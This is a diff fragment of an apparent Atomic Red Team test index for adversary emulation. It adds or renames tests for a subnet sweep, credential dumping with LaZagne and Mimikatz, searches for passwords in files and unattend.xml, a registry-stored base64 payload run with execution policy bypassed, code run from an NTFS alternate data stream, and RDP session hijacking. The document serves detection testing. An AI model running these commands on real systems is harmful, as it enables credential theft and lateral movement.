+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          $localip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]
+          $pieces = $localip.split(".")
+          $firstOctet = $pieces[0]
+          $secondOctet = $pieces[1]
+          $thirdOctet = $pieces[2]
+          foreach ($ip in 1..255 | % { "$firstOctet.$secondOctet.$thirdOctet.$_" } ) {cmd.exe /c nslookup $ip}
   T1063:
     technique:
       external_references:
@@ -15068,7 +15629,7 @@ credential-access:
       - SYSTEM
       identifier: T1081
     atomic_tests:
-    - name: Browser and System credentials
+    - name: Extract Browser and System credentials with LaZagne
       description: "[LaZagne Source](https://github.com/AlessandroZ/LaZagne)\n"
       supported_platforms:
       - macos
@@ -15077,7 +15638,7 @@ credential-access:
         command: 'python2 laZagne.py all
 
 '
-    - name: Extract credentials from files
+    - name: Extract passwords with grep
       description: 'Extracting credentials from files
 
 '
@@ -15091,10 +15652,10 @@ credential-access:
       - linux
       executor:
         name: sh
-        command: 'grep -riP password #{file_path}
+        command: 'grep -ri password #{file_path}
 
 '
-    - name: Mimikatz & Kittenz
+    - name: Runs Mimikatz & Mimikittenz by name
       description: 'Mimikatz/kittenz - This will require a Mimikatz executable or
         invoke-mimikittenz ps module.
 
@@ -15107,7 +15668,7 @@ credential-access:
         command: |
           invoke-mimikittenz
           mimikatz.exe
-    - name: Extracting credentials from files
+    - name: Extracting passwords with findstr
       description: 'Extracting Credentials from Files
 
 '
@@ -15119,6 +15680,19 @@ credential-access:
         command: |
           findstr /si pass *.xml | *.doc | *.txt | *.xls
           ls -R | select-string -Pattern password
+    - name: Access "unattend.xml"
+      description: 'Attempts to access unattend.xml, where credentials are commonly
+        stored, within the Panther directory where installation logs are stored.
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: |
+          cmd /c type C:\Windows\Panther\unattend.xml > nul 2>&1
+          cmd /c type C:\Windows\Panther\Unattend\unattend.xml > nul 2>&1
   T1214:
     technique:
       external_references:
@@ -17251,6 +17825,32 @@ execution:
         command: |
           reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggJyVTeXN0ZW1Sb290JS9UZW1wL2FydC1tYXJrZXIudHh0JyAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI="
           powershell.exe -noprofile -windowstyle hidden -executionpolicy bypass iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))
+    - name: NTFS Alternate Data Stream Access
+      description: 'Creates a file with an alternate data stream and simulates executing
+        that hidden code/file
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        ads_file:
+          description: File created to store Alternate Stream Data
+          type: String
+          default: "$env:TEMP\\NTFS_ADS.txt"
+      executor:
+        name: powershell
+        elevation_required: false
+        prereq_command: 'if((Get-Volume -DriveLetter $env:HOMEDRIVE[0]).FileSystem
+          -contains "NTFS"){0}else{1}
+
+'
+        command: |
+          Add-Content -Path #{ads_file} -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand'
+          $streamcommand = Get-Content -Path #{ads_file} -Stream 'streamcommand'
+          Invoke-Expression $streamcommand
+        cleanup_command: 'Remove:Item #{ads_file}
+
+'
   T1121:
     technique:
       external_references:
@@ -19325,6 +19925,32 @@ lateral-movement:
           sc.exe create sesshijack binpath= "cmd.exe /k tscon 1337 /dest:rdp-tcp#55"
           net start sesshijack
           sc.exe delete sesshijack
+    - name: RDPto-DomainController
+      description: 'Attempt an RDP session via "Connect-RDP" to a system. Default
+        RDPs to (%logonserver%) as the current user
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        logonserver:
+          description: ComputerName argument default %logonserver%
+          type: String
+          default: $ENV:logonserver.TrimStart("\")
+        username:
+          description: Username argument default %USERDOMAIN%\%username%
+          type: String
+          default: "$Env:USERDOMAIN\\$ENV:USERNAME"
+      executor:
+        name: powershell
+        elevation_required: false
+        prereq_command: 'if((Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain)
+          {0} else {1}
+
+'
+        command: 'Connect-RDP -ComputerName #{logonserver} -User #{username}
+
+'
   T1105:
     technique:
       external_references:
